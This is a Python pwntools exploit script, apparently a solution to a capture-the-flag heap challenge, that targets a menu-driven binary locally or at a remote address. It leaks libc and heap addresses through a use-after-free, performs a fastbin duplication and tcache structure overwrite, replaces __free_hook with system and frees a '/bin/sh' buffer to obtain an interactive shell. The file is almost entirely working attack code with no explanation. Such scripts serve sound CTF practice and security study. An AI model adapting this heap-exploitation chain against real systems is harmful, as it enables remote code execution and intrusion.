from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = '35.245.143.0'
PORT = 5555

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-linux-x86-64.so.2', TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def c_house(name, length, text):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(' : ', name)
    r.sendlineafter(' : ', str(length))
    r.sendlineafter(' : ', text)

def c_person(name, length, text):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(' : ', name)
    r.sendlineafter(' : ', str(length))
    r.sendlineafter(' : ', text)

def add(idx, hidx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(' : ', str(idx))
    r.sendlineafter(' : ', str(hidx))

def remove(hidx, idx):
    r.sendlineafter('>> ', '4')
    r.sendlineafter(' : ', str(hidx))
    r.sendlineafter(' : ', str(idx))

def v_house(idx):
    r.sendlineafter('>> ', '5')
    r.sendlineafter(' : ', str(idx))

def v_person(hidx, idx):
    r.sendlineafter('>> ', '6')
    r.sendlineafter(' : ', str(hidx))
    r.sendlineafter(' : ', str(idx))

def party(idx):
    r.sendlineafter('>> ', '7')
    r.sendlineafter(' : ', str(idx))

r = start()
if args.D:
    debug(r, [])

c_house('A', 2, 'A')
c_person('B', 0x418, 'B')
c_person('C', 0x4, 'C')
add(0, 0)
add(1, 0)

v_person(0, 0)
remove(0, 1)
v_house(0)
r.recvuntil('details  ')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')
base = leak - 0x1e4ca0
dbg('base')

mh = base + 0x1e4c30
fh = base + 0x1e75a8
system = base + 0x52fd0

c_person('D', 0x4, 'D')
c_person('E', 0x4, 'E')
c_person('F', 0x4, 'F')
add(0, 0)
add(1, 0) 
add(2, 0) 
remove(0, 1)

v_person(0, 3)
remove(0, 0)
v_house(0)
r.recvuntil('Person 3  ')
leak = u64(r.recvuntil(' with')[:-5]+'\x00'*2)
dbg('leak')
heap = leak - 0x2c0
dbg('heap')

c_person('fill', 0x8, 'fill')
c_person('fake1', 0x68, 'fake1')
add(1, 0)
c_person('fake2', 0x68, 'fake2')
add(1, 0)

c_house('h1', 2, 'h1')

for i in range(8):
    c_person(str(i), 0x68, str(i)*2)
    add(1, 1)
party(1)

v_person(0, 1)
remove(0, 2)
remove(0, 0)
party(0)

for i in range(7):
    c_person(str(i), 0x68, str(i)*2)
    add(1, 1)

# fastbindup ready
# c_person('aaaa', 0x68, p64(mh - 0x10 + 5))
c_person('aaaa', 0x68, p64(heap+0x2d0))
c_person('bbbb', 0x68, "bbbb")
c_person('cccc', 0x68, "c"*8+p64(0x71))

# tps fake header ready
c_person('tps', 0x3a0, "tps")
add(4, 1)
remove(1, 7)
add(3, 1)

# overwrite pointer to tps
c_person('dddd', 0x68, flat(0, 0, heap+0x50, 0x700000001))
remove(1, 7)

# overwrite tps
c_person('aa', 0xf8, flat(fh-8))

# reload 0x40 chunk
remove(1, 0)

# overwrite fh
c_person('hoge', 0x18, '/bin/sh\x00'+flat(system))

add(5, 1)
remove(1, 0)

r.interactive()
r.close()
